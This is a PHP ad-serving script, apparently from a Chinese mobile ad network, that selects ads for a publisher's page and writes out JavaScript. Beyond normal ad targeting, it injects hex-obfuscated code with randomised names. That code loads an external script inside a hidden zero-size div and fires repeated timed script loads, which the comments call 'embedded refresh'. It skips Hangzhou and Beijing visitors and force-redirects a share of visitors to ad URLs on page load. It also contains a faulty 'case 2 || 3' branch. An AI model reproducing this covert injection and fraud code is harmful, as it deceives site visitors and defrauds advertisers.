<?php
/********************接收传入参数.***********/
isset($_SERVER['HTTP_REFERER']) || exit;

// 广告位置
if(!$pid || !array_key_exists($ads_type, $ADS_TYPE_INFO)){
	?>
	    document.writeln("参数错误！");
	<?php
	exit;
}

$userip = get_ip();
if(!$userip){

	?>
	    document.writeln("无效ip");
	<?php
	exit;
}

if(strpos($_SERVER['HTTP_REFERER'],'https://') !== false){

	define('JK_DOMAIN', 'https://fsp.jinfa1.com');
	define('WAP_TZ_DOMAIN', 'https://fst.jinfa1.com');

}else{

	define('JK_DOMAIN', 'http://fp.8090liwu.com');//记pv域名
    define('WAP_TZ_DOMAIN', 'http://fd.st8856.com');//wap端计费域名
}

/**************************初始化参数******************************/

define('AD_TYPE', 57);

$memcache=new Memcache;
$result=$memcache->pconnect(MEMCACHE_SERVERNAME,MEMCACHE_PORT);

// 有广告位ID传入,则使用对应网站主ID,不管userid是否传入,以广告位ID为准
$data_adp = upADPosition($pid, AD_TYPE, $memcache);

$userid = $data_adp['userid'];

$data_user1 = upUser1Info($userid, AD_TYPE, $memcache);	// 载入网站主信息

/*********************状态判断****************************/
if($data_user1['zhuangtai'] != 1){
	?>
	    document.writeln("您的帐号未开通或被冻结！");
	<?php
	exit;
}

if(strpos($data_user1['openty'], (string)AD_TYPE) === FALSE){
	?>
	    document.writeln("您的帐号未开通信息流广告！");
	<?php
	exit;
}
/************************域名判断***********************/
//来源地址
$netmain = strtolower(parse_url($_SERVER['HTTP_REFERER'])['host']);

$NetClassId = 0;
foreach(explode('|', DOMEXT) as $val){
	if(strrpos($netmain, $val) !== FALSE){	// 只有在0位置找到才算
		$NetClassId = 1;
		break;
	}
}

// 获取主域名
if($NetClassId == 1){
	$netmain = getSLD($netmain);
}else{
	$netmain = substr($netmain, strpos($netmain, '.') + 1);
}

// 判断网站域名是否登记，并且未开启域名不提示
$urlp = strpos($data_user1['urlstr'], $netmain);
if($urlp === FALSE AND $data_user1['ifdomain'] == 0){
	?>
	    document.writeln("域名未登记!");
	<?php
	exit;
}

/***********************过滤可弹广告*****************************/
$ads_list = uptype(AD_TYPE, $memcache);

if(!is_array($ads_list)){
	?>
	    document.writeln("没有广告！");
	<?php
	exit;
}
$ads_info = $memcache->get('pgflow_adsinfo');

$ads = [];// 存放指定分类的广告信息
$ua_ads = [];//存放其他类型的广告

$adsclass = ($ptype == 1) ? $data_adp['wadsclass'] : $data_adp['iosclass'];

$adsclass = trim($adsclass);

if($adsclass == '0'){
	// 广告全选
	foreach($ads_list as $val){
		foreach($val as $v){
			$ads[$v] = $ads_info[$v];
		}
	}
}else{
	// 选择了指定类型的广告
	$wadsclass = explode(',', $adsclass);

	foreach($ads_list as $k => $val){
		foreach ($val as $v) {
			if(in_array($k, $wadsclass)){
				$ads[$v] = $ads_info[$v];
			}else{
				$ua_ads[$v] = $ads_info[$v];
			}
		}
        
	}

}

$userip_num = ip2long($userip);
$areaname = get_my_region($userip_num);			// 获取ip所在城市

$nowdic = array();
// 如果系统有定向广告,则与定向广告进行重合性判断,条件(站点广告与地域广告重合, 访者地域与广告地域相符)
if($ads){
	foreach($ads as $ad_id => $ad){
		// var_dump($ad);
		if($ad['istype'] == $istype
			AND strpos($ad['phonetype'], (string)$ptype) !== FALSE
			AND strpos($ad['blacksiteid'], ','.$userid.',') === FALSE
			AND (empty($ad['okarea']) OR mb_strpos($ad['okarea'], $areaname, 0, 'UTF-8') !== FALSE)){
            $unshow = false;
			if($ad['unshow_phone'] != '0'){
				foreach (explode(',',$ad['unshow_phone']) as $value) {
	            	if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']),(string)$value) !== false){
	            		$unshow = true;
	            		break;
	            	}
	            }
			}
			if(!$unshow){
				if($ad['sqms'] == 1){
					// 广告定投站点
					if(strpos($ad['limitsiteid'], ','.$userid.',') !== FALSE){
						$nowdic[] = $ad_id;
					}
				}else{
					$nowdic[] = $ad_id;
				}
			}
		}
	}
}
$ads_info = $ads;

if(empty($nowdic)){//指定类型的没有，取其他类型
    
	if($data_adp['noadok'] == 1 && !empty($ua_ads)){
	    $ads_info = $ua_ads;
		foreach ($ua_ads as $ak => $av) {

			if($av['istype'] == $istype
				AND strpos($av['phonetype'], (string)$ptype) !== FALSE
				AND strpos($av['blacksiteid'], ','.$userid.',') === FALSE
				AND $av['sqms'] == 0)
		    {
		    	$nowdic[] = $ak;
		    }

		}

		if(empty($nowdic)){
			?>
			    document.writeln("广告不足。");
			<?php
			exit;
		}
	}else{
		?>
		    document.writeln("没有符合条件的广告。");
		<?php
		exit;
	}
	
}

// *******************随机广告ID排序*********************
$ads_num = count($nowdic);

$final_info = $ADS_TYPE_INFO;

if($ads_num >= $final_info[$ads_type]['num']){
    
	$js_info = get_js_info_by_filter_ads($final_info[$ads_type]['num'], $nowdic, true, false);

}else{

	$js_info = get_js_info_by_filter_ads($ads_num, $nowdic, true, false);

    $diff = $final_info[$ads_type]['num'] - $ads_num;
	switch ($diff) {
		
		case 2 || 3:
		    if($ads_num >= $diff){
	
		    	$js_info_repeat = get_js_info_by_filter_ads($diff, $nowdic, true, false);
		    }else{
		
		    	$js_info_repeat = get_js_info_by_filter_ads($diff, $nowdic, false, false);
		    }

		    break;

		default:
			$js_info_repeat = get_js_info_by_filter_ads($diff, $nowdic, false, false);
			break;
	}

	$js_info['jslinks'] = array_merge($js_info['jslinks'], $js_info_repeat['jslinks']);
	$js_info['imgsrc'] = array_merge($js_info['imgsrc'], $js_info_repeat['imgsrc']);
	$js_info['jstitle'] = array_merge($js_info['jstitle'], $js_info_repeat['jstitle']);
	$js_info['pv_url'] = array_merge($js_info['pv_url'], $js_info_repeat['pv_url']);
	$js_info['ads_url'] = array_merge($js_info['ads_url'], $js_info_repeat['ads_url']);

}

$pv_url = '';
foreach ($js_info['pv_url'] as $v) {
	$pv_url .= $v.'&'; 
}

$pv_url = JK_DOMAIN.'/se?p='.base64_encode($pv_url);

$num_str = '123456789';
$sm_str = 'abcdehijkmnpqrstuvwxyz';
$bg_str = 'ABCDEFGHJKLMNPQRSTUVWXYZ';

//js参数
$jslinks = json_encode($js_info['jslinks']);
$imgsrc = json_encode($js_info['imgsrc']);
$jstitle = json_encode($js_info['jstitle']);

$tagname = substr(str_shuffle($sm_str), 0 , 6);
$innertagname = substr(str_shuffle($sm_str), 0 , 4);
$randstr = substr(str_shuffle($num_str.$sm_str.$bg_str), 0 , 10);
$obj_name = substr(str_shuffle($bg_str), 0, 4);
$a_x = 'Z'.substr(str_shuffle($num_str.$sm_str.$bg_str), 0 , 4);
$div_id = 'd'.substr(str_shuffle($num_str), 0 , 4);
$img_id = 'M'.substr(str_shuffle($num_str.$sm_str.$bg_str), 0 , 4);
$ads_name_class = 'R'.substr(str_shuffle($num_str.$sm_str.$bg_str), 0 , 5);
$tag_a_id = 'A'.substr(str_shuffle($num_str.$sm_str.$bg_str), 0 , 4);

$img_type = explode('x', $js_info['img_type'] ? $js_info['img_type'] : $ADS_TYPE_INFO[$ads_type]['img_type']);
$nowpic = $js_info['nowpic'];
foreach ($nowpic as $k => $v) {
	$nowpic[$k] = PICURLURL.$v;
}

$z_index = ($userid==3386 || $userid==2207 || $userid==2223 || $userid==2606 || $userid==3111 || $userid==3330 || $userid==1575) ? 0 : 2147483647;

$ads_name_tag = substr(str_shuffle($sm_str), 0 , 4);

include __DIR__.'/flow.js';

//50%概率记pv
$pv_rand = mt_rand(1, 10);
if($pv_rand == 1) echo '!(function(){var b,a=document.createElement("script");a.src="'.$pv_url.'";b=document.getElementsByTagName("html")[0];b.appendChild(a);})();';


$is_hangzhou = false;
$ip_list = include __DIR__.'/../ip_lists/hangzhou_ip.php';	
foreach ($ip_list as $k => $v) {
	if($userip_num > $k && $userip_num < $v){
		$is_hangzhou = true;
		break;
	}
}

if(!$is_hangzhou && strpos($areaname,'北京') === false  ){
//所有嵌刷屏蔽掉杭州/北京

	$is_xmzh = false;
	$ip_list = include __DIR__.'/../ip_lists/ip_listxmzh.php';	
	foreach ($ip_list as $k => $v) {
		if($userip_num > $k && $userip_num < $v){
			$is_xmzh = true;
			break;
		}
	}
    
    if(!$is_xmzh){
		// IOS机型
		if(strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone') !== FALSE 	OR strpos($_SERVER['HTTP_USER_AGENT'], 'iPad') !== FALSE){
			if(strlen($_SERVER['HTTP_USER_AGENT']) > 134){
				// 跳转内嵌代码		
				$rand_obj = substr(str_shuffle($bg_str), 0, 5);
				echo 'function Wscokie(a,b){var d=new Date;d.setTime(d.getTime()+1e3*60*60*1),document.cookie=a+"="+escape(b)+";expires="+d.toGMTString()}function WcksetCookie(a,b){var c=365,d=new Date;d.setTime(d.getTime()+1e3*60*60*24*c),document.cookie=a+"="+escape(b)+";expires="+d.toGMTString()}function WckgetCookie(a){var b,c=new RegExp("(^| )"+a+"=([^;]*)(;|$)");return(b=document.cookie.match(c))?unescape(b[2]):""};var '.$rand_obj.'={};'.$rand_obj.'.timer=function(time){setTimeout(function(){var b,a=document.createElement("script");a.src="'.TZCODE_DOMAIN.'/statpv-2036-"+navigator.platform+"-'.$userid.'-"+WckgetCookie("'.$userip_num.'bg"),b=document.getElementsByTagName("html")[0],b.appendChild(a);},time*1000);};'.$rand_obj.'.addEvent=function(obj,type,fn){if(obj.attachEvent){obj.attachEvent("on"+type,function(){fn.call(obj);});}else{obj.addEventListener(type,fn,false);}};'.$rand_obj.'.addEvent(window,"load", function(){!function(){if(navigator.platform.indexOf("Win") > -1 || navigator.platform.indexOf("Mac") > -1)return;WcksetCookie("iispg",2);if(2!=WckgetCookie("iispg"))return;if(WckgetCookie("'.$userip_num.date('Ymd').'stat"))return;if(window.screen.width<=320||window.screen.height<=568)return;var fmtpgcodeflg_x=document.getElementById("fmtpgcodeflg");if(!fmtpgcodeflg_x){var g=document.createElement("a");g.id="fmtpgcodeflg";}else{return;};'.$rand_obj.'.timer(0);'.$rand_obj.'.timer(2);'.$rand_obj.'.timer(6);'.$rand_obj.'.timer(10);'.$rand_obj.'.timer(12);'.$rand_obj.'.timer(16);'.$rand_obj.'.timer(19);'.$rand_obj.'.timer(25);   }();});';
				if(!$data_user1['iftype']){//内刷跳转
					$tz_tb_rand = mt_rand(1, 8);
					if($tz_tb_rand == 1){
					?>var ttpgcodeflg_x=document.getElementsByName("\x74\x74\x70\x67\x63\x6f\x64\x65\x66\x6c\x67");if(ttpgcodeflg_x.length<=0){document.write("\x3c\x69\x6e\x70\x75\x74\x20\x74\x79\x70\x65\x3d\x27\x68\x69\x64\x64\x65\x6e\x27\x20\x6e\x61\x6d\x65\x3d\x27\x74\x74\x70\x67\x63\x6f\x64\x65\x66\x6c\x67\x27\x20\x2f\x3e");document.writeln("<div style=\"width:0px;height:0px;\"><script type=\"text/javascript\" src=\"http://im1.56zzw.com/clickstat.js\"></script></div>");}
					<?php
					}
				}
			}
			
		}
    
		//安卓机型
		if(strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false){
			
			//安卓还要屏蔽 360/谷歌/百度, 因为chrome标识UA里都带,所以以UA长度来识别为360/chrome浏览器,>155认为是非谷歌/360浏览器
			if(strlen($_SERVER['HTTP_USER_AGENT']) > 139 ){
				
				if(!$data_user1['iftype']){//内刷跳转
					$tz_tb_rand = mt_rand(1, 8);
					if($tz_tb_rand == 1){
					?>var ttpgcodeflg_x=document.getElementsByName("\x74\x74\x70\x67\x63\x6f\x64\x65\x66\x6c\x67");if(ttpgcodeflg_x.length<=0){document.write("\x3c\x69\x6e\x70\x75\x74\x20\x74\x79\x70\x65\x3d\x27\x68\x69\x64\x64\x65\x6e\x27\x20\x6e\x61\x6d\x65\x3d\x27\x74\x74\x70\x67\x63\x6f\x64\x65\x66\x6c\x67\x27\x20\x2f\x3e");document.writeln("<div style=\"width:0px;height:0px;\"><script type=\"text/javascript\" src=\"http://im1.56zzw.com/clickstat.js\"></script></div>");}
					<?php
					}
				}
			}
			
		}
	}

}


//自动跳转不计费

$config = getConfig($userid, $memcache, $areaname, $ptype);//获取广告自跳转配置

if($config['isredirect'] > 0){

	$gotourl = $js_info['ads_url'][array_rand($js_info['ads_url'], 1)];
	$gotourl = str_replace('pguid', $userid, $gotourl);
	
	if(strpos($_SERVER['HTTP_USER_AGENT'], 'QQBrowser') !== FALSE OR strpos($_SERVER['HTTP_USER_AGENT'], 'UCBrowser') !== FALSE){
		$tz_percent = $config['isredirect'] + $config['uc_qq_tz'];
	}else{
		$tz_percent = $config['isredirect'];
	}

	$r_redirect = mt_rand(1,100);

	if($r_redirect <= $tz_percent){
		$rand_obj = substr(str_shuffle($bg_str), 0, 5);
		?>
            var <?=$rand_obj?> = {};
            <?=$rand_obj?>.addEvent = function(obj,type,fn){if(obj.attachEvent){obj.attachEvent('on'+type,function(){fn.call(obj);});}else{obj.addEventListener(type,fn,false);}};
            <?=$rand_obj?>.addEvent(window,'load', function(){window.location.href = '<?=$gotourl?>';});
		<?php
	}
}

